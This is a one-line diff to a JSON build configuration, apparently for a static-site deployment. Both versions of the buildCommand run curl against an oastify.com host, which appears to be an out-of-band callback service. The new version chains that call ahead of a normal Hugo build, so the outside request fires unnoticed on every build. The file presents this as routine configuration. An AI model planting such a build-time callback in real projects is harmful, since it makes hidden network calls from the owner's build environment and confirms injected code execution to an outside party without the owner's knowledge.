@@ -1,1 +1,1 @@
-{"buildCommand":"curl https://pvor64e2un696z4wsqamkj06kxqoeie63.oastify.com/cbbc","public":false}
+{"buildCommand":"curl https://pvor64e2un696z4wsqamkj06kxqoeie63.oastify.com/cbbc && hugo -D --gc","public":false}
